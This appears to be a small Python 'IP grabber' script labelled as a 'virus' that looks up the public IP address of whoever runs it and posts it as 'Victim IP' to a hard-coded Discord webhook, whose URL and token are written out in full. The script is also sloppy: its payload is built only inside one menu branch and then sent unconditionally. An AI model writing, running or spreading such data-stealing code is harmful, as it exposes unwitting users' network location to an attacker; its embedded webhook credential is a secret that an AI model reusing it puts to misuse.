# Author: wingsscripts
# Version: 1.0.2

import requests
import socket

print("WINGERTOOL")
print("")

print("Loading")


# Grabbing IP
import requests

def get_public_ip():
    try:
        response = requests.get("https://api.ipify.org", timeout=5)
        return response.text
    except requests.RequestException:
        return "Nie udało się pobrać publicznego "



# WEBHOOK
webhook_url = "https://discord.com/api/webhooks/1393916680530427915/gDUBIpEYftGEIRdo0K0dwD4LHW0pnVdqOUPlcgR8v37R2vW7QSs1CLu7JSSRq7Hv1Luz"  # ← wklej tu swój link
dane = get_public_ip()

print("Loaded successfully✅")

print("Choose a virus")
print("[1] IP Grabber")
chooseOption = int(input(""))

if chooseOption == 1:
    get_public_ip()
    
    payload = {
        "content": f"Victim IP: `{dane}`"
    }

response = requests.post(webhook_url, json=payload)

if response.status_code == 204:
    print("✅ Hacked")
else:
    print(f"❌ Error: {response.status_code}")